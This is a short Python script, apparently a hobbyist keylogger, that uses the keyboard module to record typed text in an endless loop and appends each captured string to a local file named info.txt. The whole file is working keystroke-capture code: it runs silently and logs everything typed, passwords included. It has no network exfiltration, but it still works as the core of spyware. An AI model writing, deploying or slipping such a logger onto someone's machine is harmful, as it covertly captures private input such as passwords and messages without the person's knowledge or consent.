# Import the keyboard module
import keyboard 

while True:
    with open('info.txt', 'a') as info: # Create file
        recording = keyboard.record(until='space') #--> When 'space' is enter, stop recording
        recording2 = keyboard.record(until='enter') #--> When 'enter' is enter, stop recording
        text = list(keyboard.get_typed_strings(recording)) #--> Create a list of all typed text
        text2 = list(keyboard.get_typed_strings(recording2))

        info.write('\n') #--> Go to another line
        info.write(text[0]) #--> print the text in the file
        info.write(text2[0])